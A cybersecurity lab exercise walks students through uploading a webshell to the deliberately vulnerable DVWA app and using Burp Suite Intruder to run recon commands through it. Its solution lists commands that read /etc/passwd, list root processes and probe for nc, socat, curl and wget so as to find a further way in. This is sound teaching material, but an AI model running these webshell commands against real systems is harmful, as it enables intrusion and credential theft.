# Webshell Recon
For this exercise, you'll perform some recon on the server you compromised in the previous class.
 
Use Firefox to navigate to DVWA. 

Then, follow the instructions below.

## Instructions

- Click on the **File Upload** tab, and upload [webshell.php](webshell.php) to the server.

- Launch Burp Suite, and intercept a request the URL where `webshell.php` was uploaded.

- Send the request to **Intruder**. Set a position around the command in the request, and send payloads that will dump the following information:
  - The current user ID and group ID
  - A list of running processes running as root
  - The contents of `/etc/passwd`
  - Check if the following network tools are installed:
    - `nc`
    - `ncat`
    - `socat`
    - `curl`
    - `wget`
    - **Hint**: To check if a tool exists, check for its version with, e.g.: `nc --version`.

  > **Solution**: The solution uses the command payloads below.
  > 
  > ```bash
  >  # Your Intruder payload should look like the following:
  >  GET /hackable/uploads/webshell.php?cmd=§id§ HTTP/1.1
  >  # User and Group ID
  >  id
  >  # Processes running as root
  >  ps aux | grep root
  >  # Contents of /etc/passwd
  >  cat /etc/passwd
  >  # Existence of network tools
  >  nc --version
  >  ncat --version
  >  socat --version
  >  curl --version
  >  wget --version
  > The non-existence of network utilities means you will not be able to leverage them to break in you will have to find another way to compromise it. 
  > ```

- Read the following Server Fault thread: <https://serverfault.com/questions/519215/what-is-the-difference-between-sbin-nologin-and-bin-false>
